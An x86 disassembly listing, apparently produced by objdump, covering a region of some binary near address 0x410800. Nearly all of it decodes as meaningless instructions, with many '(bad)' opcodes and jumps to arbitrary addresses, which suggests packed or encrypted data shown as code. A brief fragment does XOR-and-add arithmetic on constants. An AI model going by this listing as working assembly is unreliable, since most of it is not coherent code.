  4107b5:	sub    al,0xb8
  4107b7:	ret    
  4107b8:	push   0x2
  4107ba:	mov    ds:0xbc311b8f,al
  4107bf:	or     eax,0x5f8a2668
  4107c4:	mov    ebp,0x48e6d3bb
  4107c9:	(bad)
  4107cc:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4107ce:	bound  edi,QWORD PTR [esi-0x34]
  4107d1:	sbb    cl,BYTE PTR [esi+0x71]
  4107d4:	shl    BYTE PTR [edx+0x65a62390],0xc2
  4107db:	pushf  
  4107dc:	loope  0x410822
  4107de:	cmp    al,0xa0
  4107e0:	repz jmp 0xe339:0x68d3eb4c
  4107e8:	ss jmp 0x4107b6
  4107eb:	push   ss
  4107ec:	cmp    dh,BYTE PTR [bx+di]
  4107ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107f0:	(bad)  
  4107f1:	jmp    0xfe041b0f
  4107f6:	xchg   esi,eax
  4107f7:	iret   
  4107f8:	and    eax,0x1ef5a3e3
  4107fd:	sbb    eax,0xaa109663
  410802:	(bad)  [edi-0x7e]
  410805:	mov    ch,0x9c
  410807:	ss mov al,0x49
  41080a:	mov    al,0x88
  41080c:	add    cl,ah
  41080e:	mov    ch,0x77
  410810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410811:	cli    
  410812:	fiadd  DWORD PTR [esi+0x5e7b0fca]
  410819:	daa    
  41081a:	mov    ds:0x1ec7f619,al
  41081f:	int    0x1d
  410821:	dec    edx
  410822:	add    eax,0xc1f6def8
  410827:	adc    BYTE PTR [edx],bl
  410829:	and    al,0x27
  41082b:	jo     0x41082e
  41082d:	test   BYTE PTR [edi+0x7a33da32],ah
  410833:	pop    edi
  410834:	or     BYTE PTR [ecx-0x1c5092e9],ch
  41083a:	aas    
  41083b:	fbld   TBYTE PTR ds:0xd2152320
  410841:	adc    al,0xe2
  410843:	pop    ecx
  410844:	cmp    eax,0x174b6d6d
  410849:	push   ss
  41084a:	outs   dx,DWORD PTR ds:[esi]
  41084b:	clc    
  41084c:	arpl   WORD PTR [edi-0x6b],dx
  41084f:	and    DWORD PTR [ebp+0x31],eax
  410852:	add    ebp,ebx
  410854:	in     eax,dx
  410855:	js     0x4108c9
  410857:	or     al,0x98
  410859:	inc    eax
  41085a:	stos   DWORD PTR es:[edi],eax
  41085b:	mov    bh,0xb3
  41085d:	sub    ch,dh
  41085f:	test   eax,0x638b1d20
  410864:	add    cl,bl
  410866:	add    BYTE PTR [edi-0x67],ah
  410869:	cmp    dh,BYTE PTR [ecx-0x31]
  41086c:	das    
  41086d:	mov    ebx,0x5ffc421a
  410872:	rcr    edx,1
  410874:	fidivr WORD PTR [esi]
  410876:	iret   
  410877:	shr    DWORD PTR [ebx],cl
  410879:	pop    edx
  41087a:	sub    eax,0x42a0cb06
  41087f:	jg     0x410826
  410881:	fsubr  DWORD PTR [eax]
  410883:	into   
  410884:	mov    bh,0xaf
  410886:	push   0x8b855d05
  41088b:	sub    DWORD PTR [edi],eax
  41088d:	outs   dx,BYTE PTR ds:[esi]
  41088e:	or     eax,0xcad15720
  410893:	loopne 0x410871
  410895:	imul   ebx,DWORD PTR [eax],0x60
  410898:	clc    
  410899:	pusha  
  41089a:	jle    0x410825
  41089c:	(bad)  
  41089d:	dec    eax
  41089e:	out    dx,eax
  41089f:	sahf   
  4108a0:	push   ecx
  4108a1:	push   ds
  4108a2:	cs pop esi
  4108a4:	aaa    
  4108a5:	inc    edi
  4108a6:	ret    0x1f98
  4108a9:	adc    al,0x60
  4108ab:	pop    ebp
  4108ac:	mov    al,0xee
  4108ae:	pop    edx
  4108af:	in     eax,dx
  4108b0:	dec    esp
  4108b1:	sub    BYTE PTR [eax+0x35],al
  4108b4:	fidiv  DWORD PTR [ebx]
  4108b6:	pusha  
  4108b7:	mov    esi,0xb7b2a3b2
  4108bc:	hlt    
  4108bd:	call   0xc5db0eed
  4108c2:	sbb    al,0x84
  4108c4:	cli    
  4108c5:	lea    ecx,[ebp+0x48670cd5]
  4108cb:	mov    ch,0x2
  4108cd:	in     eax,dx
  4108ce:	mov    cs,WORD PTR [edx-0x62]
  4108d1:	pop    esi
  4108d2:	inc    ebp
  4108d3:	push   0xc1323a2b
  4108d8:	std    
  4108d9:	(bad)  
  4108db:	(bad)
  4108de:	sub    DWORD PTR [esp+edx*8-0x6c],edi
  4108e2:	fadd   QWORD PTR es:[eax]
  4108e5:	jno    0x410941
  4108e7:	shl    dh,0x42
  4108ea:	push   ecx
  4108eb:	ins    DWORD PTR es:[edi],dx
  4108ec:	fadd   QWORD PTR [ebp+0x6a0c978a]
  4108f2:	sbb    eax,0xa10856ad
  4108f7:	jbe    0x4108ac
  4108f9:	int    0xc9
  4108fb:	lds    edx,FWORD PTR [edi]
  4108fd:	mov    ?,ebp
  4108ff:	jle    0x4108fd
  410901:	(bad)  
  410902:	scas   al,BYTE PTR es:[edi]
  410903:	repz push ebx
  410905:	dec    edx
  410906:	lea    ebp,[ebx]
  410908:	mov    al,ds:0x5c8beb5a
  41090d:	(bad)  
  41090e:	mov    esp,0x8cd114ca
  410913:	imul   esi,DWORD PTR [edi+0x3f],0xf8e3e7a2
  41091a:	rcl    BYTE PTR [ebx-0x41285d17],0xd3
  410921:	mov    dh,0x4b
  410923:	fwait
  410924:	adc    al,0xe1
  410926:	jl     0x410970
  410928:	imul   DWORD PTR [eax-0x38]
  41092b:	(bad)  
  41092c:	fcomp  DWORD PTR [edx-0x58b6c265]
  410932:	xor    DWORD PTR [ebx],esp
  410934:	push   edx
  410935:	inc    ebx
  410936:	pop    edi
  410937:	dec    edx
  410938:	std    
  410939:	cmp    al,ch
  41093b:	outs   dx,BYTE PTR ds:[esi]
  41093c:	jnp    0x41095c
  41093e:	(bad)  
  41093f:	ds clc 
  410941:	cli    
  410942:	inc    ebx
  410943:	push   cs
  410944:	(bad)  
  410945:	call   0xd5e2b032
  41094a:	xor    al,ah
  41094c:	and    al,0x24
  41094e:	xor    esi,eax
  410950:	push   ss
  410951:	adc    bl,BYTE PTR [ebp+0x2412df58]
  410957:	ins    DWORD PTR es:[edi],dx
  410958:	in     al,0xa3
  41095a:	popf   
  41095b:	sti    
  41095c:	and    ecx,DWORD PTR [edx-0x11]
  41095f:	leave  
  410960:	inc    esi
  410961:	out    dx,eax
  410962:	jecxz  0x4109cb
  410964:	push   esp
  410965:	sub    al,0x21
  410967:	in     al,dx
  410968:	jecxz  0x41094f
  41096a:	fdecstp 
  41096c:	repnz stos BYTE PTR es:[edi],al
  41096e:	push   ebx
  41096f:	clc    
  410970:	mov    cl,0x15
  410972:	jle    0x4108f5
  410974:	retf   
  410975:	loope  0x410939
  410977:	sub    DWORD PTR [ebx],eax
  410979:	test   al,0x1d
  41097b:	mov    ebx,0xb526ea32
  410980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410981:	adc    DWORD PTR fs:[edx],0xf9813aab
  410988:	xchg   ebx,eax
  410989:	or     eax,0xee3830ac
  41098e:	pop    ebp
  41098f:	mov    ebx,0xc4205b88
  410994:	pop    es
  410995:	and    DWORD PTR [ebx+0x33065049],ecx
  41099b:	xor    BYTE PTR [ebx+0x46515aec],ah
  4109a1:	stos   DWORD PTR es:[edi],eax
  4109a2:	(bad)  
  4109a3:	ja     0x4109c0
  4109a5:	and    DWORD PTR [edx],edx
  4109a7:	enterw 0xfe92,0x80
  4109ac:	mov    dl,0xda
  4109ae:	push   ds
  4109af:	xor    al,0xa1
  4109b1:	add    al,BYTE PTR [ebx-0x6e]
  4109b4:	jmp    0x4109c2
  4109b6:	daa    
  4109b7:	add    al,0x39
  4109b9:	adc    BYTE PTR [eax-0x248512ad],dl
  4109bf:	jns    0x410a09
  4109c1:	in     eax,dx
  4109c2:	and    DWORD PTR [edi+esi*2],eax
  4109c5:	xchg   ebp,eax
  4109c6:	and    DWORD PTR [esi+0x1bad8f6b],esi
  4109cc:	shl    DWORD PTR ds:0x2447228f,0x7d
  4109d3:	je     0x410957
  4109d5:	pop    es
  4109d6:	retf   0x205d
  4109d9:	es leave 
  4109db:	and    DWORD PTR [ecx],esi
  4109dd:	fld    QWORD PTR [edx]
  4109df:	and    al,0x2d
  4109e1:	in     al,dx
  4109e2:	cmc    
  4109e3:	lods   eax,DWORD PTR ds:[esi]
  4109e4:	mov    edx,0x54846231
  4109e9:	push   ecx
  4109ea:	jo     0x41097f
  4109ec:	pop    ds
  4109ed:	or     esi,ecx
  4109ef:	adc    BYTE PTR [esi-0x67a5565a],dl
  4109f5:	adc    BYTE PTR [edi-0x109e21b4],dh
  4109fb:	in     al,dx
  4109fc:	jmp    0x2770f5b4
  410a01:	rep outs dx,DWORD PTR ds:[esi]
  410a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a04:	in     al,dx
  410a05:	je     0x4109ec
  410a07:	in     eax,dx
  410a08:	aam    0x72
  410a0a:	mov    dh,0xe9
  410a0c:	mov    cs,WORD PTR [ebp+0x60]
  410a0f:	mov    ds:0xc1b98209,al
  410a14:	cwde   
  410a15:	lea    ebp,[edx+0x31]
  410a18:	jecxz  0x410a23
  410a1a:	call   0xa006:0xf4a0ec17
  410a21:	mov    al,ds:0x43ec7048
  410a26:	mov    dl,0xfa
  410a28:	aam    0x77
  410a2a:	adc    eax,0xb0dfae2
  410a2f:	and    edi,DWORD PTR [edi]
  410a31:	into   
  410a32:	sbb    eax,DWORD PTR [edi+0x19296518]
  410a38:	cdq    
  410a39:	inc    esp
  410a3a:	push   ebx
  410a3b:	jne    0x410a07
  410a3d:	arpl   dx,cx
  410a3f:	fcmovnbe st,st(1)
  410a41:	xchg   BYTE PTR [ecx+ebx*2-0x7a6ad0ca],al
  410a48:	in     eax,dx
  410a49:	adc    al,BYTE PTR [edx-0x12ec231a]
  410a4f:	test   BYTE PTR [eax-0x49],bh
  410a52:	xchg   ebx,eax
  410a53:	aad    0x40
  410a55:	push   ecx
  410a56:	push   ds
  410a57:	sbb    eax,0xd9a5bdc4
  410a5c:	mov    dl,0x97
  410a5e:	pop    ecx
  410a5f:	or     bl,ch
  410a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a62:	lods   al,BYTE PTR ds:[esi]
  410a63:	pop    esp
  410a64:	cmp    al,0xf3
  410a66:	sbb    BYTE PTR [edi+0x53],cl
  410a69:	fcom   QWORD PTR ds:0x3a51103e
  410a6f:	cmc    
  410a70:	call   0xa9e4:0x8cc6ac38
  410a77:	ins    BYTE PTR es:[edi],dx
  410a78:	sub    DWORD PTR [eax],ebx
  410a7a:	push   ebx
  410a7b:	fstp   TBYTE PTR [edi+eax*4+0x495908af]
  410a82:	dec    esp
  410a83:	test   eax,0x3b24e5b7
  410a88:	mov    al,0xfb
  410a8a:	pop    esp
  410a8b:	push   esi
  410a8c:	dec    edx
  410a8d:	inc    ebx
  410a8e:	and    al,0x8
  410a90:	enter  0xd3dc,0x2d
  410a94:	xor    eax,0x6ee6b4c9
  410a99:	mov    esi,ds
  410a9b:	lock xchg ebp,eax
  410a9d:	sbb    bl,BYTE PTR [edx+0x19]
  410aa0:	inc    edi
  410aa1:	mov    ebx,?
  410aa3:	jb     0x410a65
  410aa5:	pop    edx
  410aa6:	pop    ecx
  410aa7:	sbb    eax,0x61f2b595
  410aac:	call   0xdee0fc8a
  410ab1:	mov    ch,0xac
  410ab3:	rcr    BYTE PTR [eax-0x78],1
  410ab6:	or     dh,BYTE PTR [ecx+0x18df7ce7]
  410abc:	not    edx
  410abe:	cmp    ebx,DWORD PTR [ecx]
  410ac0:	stos   BYTE PTR es:[edi],al
  410ac1:	sbb    edi,DWORD PTR [ebx-0x5f]
  410ac4:	dec    ebp
  410ac5:	mov    ah,0xbc
  410ac7:	sub    eax,0x67bf9c46
  410acc:	lock pop ebx
  410ace:	pop    ds
  410acf:	in     eax,0x8d
  410ad1:	or     DWORD PTR [eax],0xb6b39ccf
  410ad7:	cld    
  410ad8:	shl    DWORD PTR [ebp-0x60781b42],0x39
  410adf:	and    eax,0x831e6df7
  410ae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ae5:	sub    ebp,DWORD PTR [edx-0x44a7f226]
  410aeb:	xlat   BYTE PTR ds:[ebx]
  410aec:	adc    ebx,esp
  410aee:	pop    ecx
  410aef:	imul   ecx,DWORD PTR [eax],0xfffffff2
  410af2:	push   ss
  410af3:	xor    edi,DWORD PTR [eax]
  410af5:	mov    bl,BYTE PTR [ecx]
  410af7:	fcom   QWORD PTR [esi+0x52480e1d]
  410afd:	jmp    0x410aab
  410aff:	pop    ebp
  410b00:	inc    ecx
  410b01:	or     bh,BYTE PTR [esi-0x50]
  410b04:	cmp    eax,0xe2c34a72
  410b09:	in     al,0x10
  410b0b:	(bad)  
  410b0c:	ja     0x410b75
  410b0e:	ins    BYTE PTR es:[edi],dx
  410b0f:	or     ebp,DWORD PTR [ebp+0x307aa869]
  410b15:	lods   al,BYTE PTR ds:[si]
  410b17:	mov    ds:0x1f16e116,eax
  410b1c:	fisubr DWORD PTR [ebx-0x52]
  410b1f:	test   eax,0x6e1780f5
  410b24:	jnp    0x410b93
  410b26:	nop
  410b27:	dec    ebp
  410b28:	das    
  410b29:	mov    WORD PTR [esi+0x7b4e1820],fs
  410b2f:	push   ds
  410b30:	iret   
  410b31:	push   ebx
  410b32:	dec    edi
  410b33:	std    
  410b34:	adc    BYTE PTR [ecx+0x64],dh
  410b37:	and    DWORD PTR [ecx],esi
  410b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b3a:	(bad)  
  410b3b:	xor    BYTE PTR [ecx+ecx*8],dh
  410b3e:	div    DWORD PTR [ecx-0x70]
  410b41:	xor    eax,DWORD PTR [eax-0x9323d31]
  410b47:	(bad)  
  410b49:	and    DWORD PTR ds:0x9dc3463b,0xb36356f1
  410b53:	dec    edi
  410b54:	int    0xb
  410b56:	jns    0x410ae8
  410b58:	test   eax,esp
  410b5a:	dec    ecx
  410b5b:	lahf   
  410b5c:	std    
  410b5d:	push   0x39434b80
  410b62:	inc    esi
  410b63:	push   esp
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz dec esi
  410ba5:	das    
  410ba6:	ret    
  410ba7:	scas   eax,DWORD PTR es:[edi]
  410ba8:	ds inc edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410c22
  410bb1:	jp     0x410bc8
  410bb3:	popf   
  410bb4:	and    esi,DWORD PTR [ebx+0x5b503740]
  410bba:	sti    
  410bbb:	add    BYTE PTR [edi+0x57971c4],dl
  410bc1:	and    al,0x21
  410bc3:	je     0x410c07
  410bc5:	add    cl,BYTE PTR [esp+ecx*2+0x70]
  410bc9:	cmc    
  410bca:	daa    
  410bcb:	stc    
  410bcc:	ds inc eax
  410bce:	outs   dx,BYTE PTR ds:[esi]
  410bcf:	jo     0x410c15
  410bd1:	jne    0x410bd2
  410bd3:	ror    BYTE PTR [esi+0x79],1
  410bd6:	dec    ecx
  410bd7:	sub    BYTE PTR [esi+eiz*1+0x5a5aa790],cl
  410bde:	imul   esp,DWORD PTR [edi],0x7a52f8a0
  410be4:	pop    edi
  410be5:	std    
  410be6:	neg    DWORD PTR [edx-0x3d]
  410be9:	jmp    0x410b9b
  410beb:	outs   dx,DWORD PTR ds:[esi]
  410bec:	dec    eax
  410bed:	shl    DWORD PTR es:[ebp-0x6c88d294],1
  410bf4:	gs inc edx
  410bf6:	cdq    
  410bf7:	(bad)  
  410bf8:	sub    al,0xb8
  410bfa:	and    BYTE PTR [esi+0xd],0x1b
  410bfe:	stos   BYTE PTR es:[edi],al
  410bff:	gs (bad) 
  410c01:	sub    al,0x77
  410c03:	ficomp DWORD PTR ds:0xa004823d
  410c09:	inc    ecx
  410c0a:	in     al,0xc7
  410c0c:	sbb    DWORD PTR [ebp+0x3b],ebx
  410c0f:	iret   
  410c10:	jmp    0x410c37
  410c12:	sub    ch,BYTE PTR [eax]
  410c14:	mov    cl,0xd9
  410c16:	repnz or edx,DWORD PTR [eax+0x5c]
  410c1a:	dec    ebx
  410c1b:	inc    eax
  410c1c:	(bad)  [ebx]
  410c1e:	adc    DWORD PTR [eax],0xce416296
  410c24:	xchg   ecx,eax
  410c25:	ja     0x410c0e
  410c27:	dec    ah
  410c29:	jne    0x410bd4
  410c2b:	ins    DWORD PTR es:[edi],dx
  410c2c:	aaa    
  410c2d:	scas   al,BYTE PTR es:[edi]
  410c2e:	add    al,0x97
  410c30:	or     eax,0x24306f91
  410c35:	push   esi
  410c36:	add    al,0x1d
  410c38:	retf   
  410c39:	dec    edi
  410c3a:	xor    ebp,DWORD PTR ds:0xfe1025fc
  410c40:	out    dx,al
  410c41:	sub    ch,BYTE PTR [ebx]
  410c43:	add    dh,BYTE PTR [eax+esi*8-0x6070fe05]
  410c4a:	dec    ebp
  410c4b:	shr    DWORD PTR [ecx+0xa],0x21
  410c4f:	je     0x410c25
  410c51:	adc    eax,0xec64bca8
  410c56:	inc    ebx
  410c57:	inc    ebx
  410c58:	jecxz  0x410c0e
  410c5a:	popf   
  410c5b:	mov    dh,0xfb
  410c5d:	mov    BYTE PTR [edi-0x5e841143],cl
  410c63:	sbb    al,0x7b
  410c65:	cld    
  410c66:	jmp    0x410c23
  410c68:	loope  0x410cd5
  410c6a:	scas   eax,DWORD PTR es:[edi]
  410c6b:	mov    cl,ch
  410c6d:	add    edi,0xffffffd2
  410c70:	das    
  410c71:	pop    ds
  410c72:	mov    bh,BYTE PTR [ebx+0x14c9cea6]
  410c78:	or     al,0xbe
  410c7a:	sub    al,0x39
  410c7c:	stos   DWORD PTR es:[edi],eax
  410c7d:	test   BYTE PTR [edi-0x6db8e9bc],bh
  410c83:	iret   
  410c84:	cmp    DWORD PTR [edi+0xcde8083],edx
  410c8a:	cmp    DWORD PTR [edi-0x6d240e7c],edx
  410c90:	cmc    
  410c91:	(bad)  
  410c92:	test   al,0xdb
  410c94:	lahf   
  410c95:	lahf   
  410c96:	cmc    
  410c97:	fs sub eax,0xfb90d66b
  410c9d:	and    al,0xd3
  410c9f:	cmp    DWORD PTR [eax-0x2f],0x4d42bc7d
  410ca6:	(bad)  
  410ca7:	mov    esi,0x9232f9af
  410cac:	test   eax,0xc86c36e0
  410cb1:	xchg   edx,eax
  410cb2:	xlat   BYTE PTR ds:[ebx]
  410cb3:	in     al,dx
  410cb4:	das    
  410cb5:	imul   ebx,DWORD PTR [edx],0x9a603199
  410cbb:	or     DWORD PTR [eax-0x1e],ebp
  410cbe:	ins    DWORD PTR es:[edi],dx
  410cbf:	icebp  
  410cc0:	in     al,dx
  410cc1:	arpl   WORD PTR [esi*8+0x799dad2],cx
  410cc8:	loope  0x410c88
  410cca:	mov    ah,0x7
  410ccc:	mov    ds:0xfca651f2,eax
  410cd1:	mov    BYTE PTR [esi-0x2ab605d7],cl
  410cd7:	sub    eax,0x3449bb24
  410cdc:	call   0x40d7:0xb18ede26
  410ce3:	int    0x22
  410ce5:	lds    ebp,FWORD PTR [ecx+0x10]
  410ce8:	or     ch,BYTE PTR [edi+0x300a0b3]
  410cee:	mov    ah,0x68
  410cf0:	bound  edi,QWORD PTR [ebx]
  410cf2:	push   es
  410cf3:	mov    bh,0x8d
  410cf5:	pop    ss
  410cf6:	hlt    
  410cf7:	jb     0x410cfa
  410cf9:	add    eax,0x1334ff87
  410cfe:	jno    0x410d65
  410d00:	ja     0x410d2e
  410d02:	call   0x4f0c:0xc53411b4
  410d09:	pushf  
  410d0a:	mov    ds:0xa3f29b68,al
  410d0f:	loop   0x410d86
  410d11:	icebp  
  410d12:	mov    esi,0x407fdb60
  410d17:	bound  ebp,QWORD PTR ds:[ebp+0x10]
  410d1b:	xchg   esi,eax
  410d1c:	ret    0x3367
  410d1f:	je     0x410cc4
  410d21:	fs sub al,0x75
  410d24:	and    al,0x7e
  410d26:	xlat   BYTE PTR ds:[ebx]
  410d27:	shl    BYTE PTR [ecx-0x25],1
  410d2a:	popa   
  410d2b:	push   esp
  410d2c:	xchg   ecx,eax
  410d2d:	push   0x5
  410d2f:	or     eax,0xa7663f24
  410d34:	rol    BYTE PTR [ebp-0x1dc56ff6],cl
  410d3a:	push   esp
  410d3b:	fist   WORD PTR [ebx+esi*4+0xf8aa3f1]
  410d42:	shl    BYTE PTR [edi-0x58],1
  410d45:	mov    esp,0xaae411fa
  410d4a:	inc    ecx
  410d4b:	loopne 0x410da9
  410d4d:	jno    0x410d56
  410d4f:	gs (bad) 
  410d51:	sbb    eax,0x405d3e41
  410d56:	iret   
  410d57:	xor    eax,0x31a598c7
  410d5c:	mov    al,0x7c
  410d5e:	ins    DWORD PTR es:[edi],dx
  410d5f:	cmp    BYTE PTR [esi],bl
  410d61:	cmc    
  410d62:	in     al,0x18
  410d64:	dec    edi
  410d65:	icebp  
  410d66:	inc    ecx
  410d67:	sbb    eax,0x2eba0200
  410d6c:	ror    DWORD PTR [ecx+0x46c59b33],1
  410d72:	jno    0x410db8
  410d74:	cmp    edx,DWORD PTR [ecx]
  410d76:	pop    ss
  410d77:	test   dl,0xda
  410d7a:	dec    eax
  410d7b:	in     al,dx
  410d7c:	stc    
  410d7d:	xchg   esp,eax
  410d7e:	std    
  410d7f:	add    al,0x98
  410d81:	push   cs
  410d82:	pusha  
  410d83:	sbb    DWORD PTR [esi+edx*8-0xf],0x3e93374f
  410d8b:	pushf  
  410d8c:	int    0xe5
  410d8e:	xchg   al,dl
  410d90:	mov    eax,0xee72b89d
  410d95:	daa    
  410d96:	dec    ebp
  410d97:	dec    ebx
  410d98:	ja     0x410d6d
  410d9a:	out    0x8a,al
  410d9c:	sbb    DWORD PTR [ebx+0x61],ecx
  410d9f:	adc    esp,edi
  410da1:	xor    dh,dh
  410da3:	(bad)  
  410da4:	call   0x135b8a37
  410da9:	and    dl,dh
  410dab:	jg     0x410dd6
  410dad:	or     al,0xce
  410daf:	jnp    0x410e00
  410db1:	es test dh,bl
  410db4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410db5:	hlt    
  410db6:	outs   dx,BYTE PTR ds:[esi]
  410db7:	cmp    eax,0xd6dc8ae8
  410dbc:	fnstcw WORD PTR [edi+ebp*8-0x36]
  410dc0:	mov    esp,0x9a01e8c1
  410dc5:	xlat   BYTE PTR ds:[ebx]
  410dc6:	test   BYTE PTR [eax+0x17b01ac4],dl
  410dcc:	xor    eax,0x798d232d
  410dd1:	stos   DWORD PTR es:[edi],eax
  410dd2:	(bad)  
  410dd3:	mov    esp,0x7643c016
  410dd8:	hlt    
  410dd9:	dec    ch
  410ddb:	sub    eax,0x892f2ea9
  410de0:	mov    al,0x83
  410de2:	inc    esp
  410de3:	mov    ch,0x5e
  410de5:	aad    0xfc
  410de7:	jle    0x410e4b
  410de9:	mov    esp,0xaa44ce69
  410dee:	jge    0x410dd2
  410df0:	xor    bl,bh
  410df2:	mov    BYTE PTR [edx],dh
  410df4:	xchg   edi,eax
  410df5:	mov    ebx,0x1ed57e25
  410dfa:	or     cl,ah
  410dfc:	pop    ss
  410dfd:	imul   BYTE PTR [edi]
  410dff:	pop    esp
  410e00:	outs   dx,BYTE PTR ds:[esi]
  410e01:	mov    ah,0x2f
  410e03:	(bad)  
  410e04:	jl     0x410db4
  410e06:	das    
  410e07:	ds leave 
  410e09:	push   0x25c03a73
  410e0e:	pop    es
  410e0f:	xor    al,0x33
  410e11:	inc    esp
  410e12:	not    esi
  410e14:	stos   DWORD PTR es:[edi],eax
  410e15:	fcomip st,st(2)
  410e17:	jns    0x410e6b
  410e19:	mov    esp,0xa2f8cdc1
  410e1e:	in     al,0x7b
  410e20:	adc    DWORD PTR [eax],0xfb864d71
  410e26:	sbb    al,0xae
  410e28:	sar    BYTE PTR [edi-0x43],cl
  410e2b:	jnp    0x410dc9
  410e2d:	int3   
  410e2e:	(bad)  
  410e2f:	mov    ah,0xb1
  410e31:	mov    esi,0xdf876326
  410e36:	pusha  
  410e37:	(bad)  
  410e38:	cmp    ch,bl
  410e3a:	push   edx
  410e3b:	hlt    
  410e3c:	or     BYTE PTR [ecx+0x1cf80a0a],ah
  410e42:	ficomp WORD PTR [edi-0x2111976c]
  410e48:	inc    ecx
  410e49:	inc    ecx
  410e4a:	in     al,dx
  410e4b:	mov    fs,edi
  410e4d:	mov    ebp,ebx
  410e4f:	or     bl,BYTE PTR [eax-0x73]
  410e52:	std    
  410e53:	add    edx,ebx
  410e55:	cld    
  410e56:	shr    DWORD PTR [edx+0x3d7d4da8],0x6c
  410e5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e5e:	mov    al,ds:0x890b2ea8
  410e63:	push   0x68dd4a4f
  410e68:	pop    es
  410e69:	sbb    dl,BYTE PTR [esi-0x7beea0d8]
  410e6f:	ins    DWORD PTR es:[edi],dx
  410e70:	aam    0xa3
  410e72:	cmp    DWORD PTR [edx+0x7f],esi
  410e75:	adc    eax,0x5c01a177
  410e7a:	loop   0x410e79
  410e7c:	(bad)  
  410e7d:	sbb    eax,0x3df25f10
  410e82:	cli    
  410e83:	repz rol esp,cl
  410e86:	dec    eax
  410e87:	push   ss
  410e88:	inc    ecx
  410e89:	in     al,0x15
  410e8b:	cmp    al,0xf
  410e8d:	test   al,0x5b
  410e8f:	mov    cl,0xb7
  410e91:	adc    al,0x72
  410e93:	sub    eax,0x5bc17301
  410e98:	lds    edi,FWORD PTR [esp+ecx*8]
  410e9b:	pop    edx
  410e9c:	mov    bh,0xc5
  410e9e:	fadd   st(6),st
  410ea0:	or     BYTE PTR [eax+0x72fbb52a],cl
  410ea6:	jb     0x410e50
  410ea8:	dec    ecx
  410ea9:	aam    0x7a
  410eab:	push   edi
  410eac:	mov    eax,ds:0xa45f47cd
  410eb2:	cmp    al,0x5a
  410eb4:	ret    0xcff3
  410eb7:	test   al,0xc
  410eb9:	or     ch,dh
  410ebb:	inc    ecx
  410ebc:	cmp    BYTE PTR [esi-0xbf13221],bh
  410ec2:	hlt    
  410ec3:	es and dl,0x57
  410ec7:	pop    eax
  410ec8:	retf   
  410ec9:	xchg   ecx,eax
  410eca:	mov    al,ds:0xf0e7f105
  410ecf:	mov    ah,0x9
  410ed1:	inc    eax
  410ed2:	add    edx,DWORD PTR [ebx-0x753fa91c]
  410ed8:	cmp    al,dh
  410eda:	add    edx,DWORD PTR [esp+edx*8]
  410edd:	or     BYTE PTR [esi],al
  410edf:	and    eax,0x19964de6
  410ee4:	jnp    0x410f21
  410ee6:	cli    
  410ee7:	pop    ebx
  410ee8:	int    0x58
  410eea:	loope  0x410f59
  410eec:	in     eax,0xfd
  410eee:	les    edx,FWORD PTR ds:[ebx+eiz*8+0x62]
  410ef3:	ds fs mov al,cl
  410ef7:	jnp    0x410eb7
  410ef9:	jle    0x410ead
  410efb:	fcomp  st(7)
  410efd:	cdq    
  410efe:	add    DWORD PTR [ebp+0x42],edi
  410f01:	mov    ds:0x6819b8f9,eax
  410f06:	xchg   ebp,eax
  410f07:	jae    0x410f23
  410f09:	das    
  410f0a:	out    0x90,eax
  410f0c:	mov    edx,ecx
  410f0e:	ins    BYTE PTR es:[edi],dx
  410f0f:	xchg   BYTE PTR [ecx],al
  410f11:	in     al,dx
  410f12:	dec    ebp
  410f13:	mov    BYTE PTR [edi+eiz*8+0x6f1613e3],cl
  410f1a:	enter  0xc793,0x9f
  410f1e:	mov    dl,0x19
  410f20:	loope  0x410f35
  410f22:	loope  0x410f6b
  410f24:	int3   
  410f25:	mov    ds:0xe4e224dc,al
  410f2a:	int3   
  410f2b:	push   ds
  410f2c:	dec    esp
  410f2d:	xor    eax,0x1c719e47
  410f32:	push   ds
  410f33:	inc    ebp
  410f34:	in     al,dx
  410f35:	xchg   al,dh
  410f37:	adc    ecx,DWORD PTR [eax-0x78e08d1b]
  410f3d:	stos   BYTE PTR es:[edi],al
  410f3e:	cld    
  410f3f:	mov    esi,0x6ff6f6f5
  410f44:	xor    eax,0x29c79960
  410f49:	jge    0x410eee
  410f4b:	cmc    
  410f4c:	mov    edx,0xdc948511
  410f51:	ins    DWORD PTR es:[edi],dx
  410f52:	xchg   esp,eax
  410f53:	or     DWORD PTR [ebp+0x2e],ecx
  410f56:	jmp    0xde794211
  410f5b:	mov    esi,0x43c32a85
  410f60:	sub    dl,BYTE PTR ds:[esi+edx*4+0x666ec7d7]
  410f68:	sahf   
  410f69:	push   edi
  410f6a:	stos   DWORD PTR es:[edi],eax
  410f6b:	ins    DWORD PTR es:[edi],dx
  410f6c:	lock inc eax
  410f6e:	jb     0x410f27
  410f70:	jg     0x410fa0
  410f72:	cmp    edx,DWORD PTR [eax-0x5]
  410f75:	ror    BYTE PTR [ebp+0x58],cl
  410f78:	aas    
  410f79:	xchg   ecx,eax
  410f7a:	sub    BYTE PTR [edi+ebx*4],al
  410f7d:	xor    al,BYTE PTR [edi-0x34]
  410f80:	xchg   BYTE PTR [ecx],dl
  410f82:	inc    ebx
  410f83:	cld    
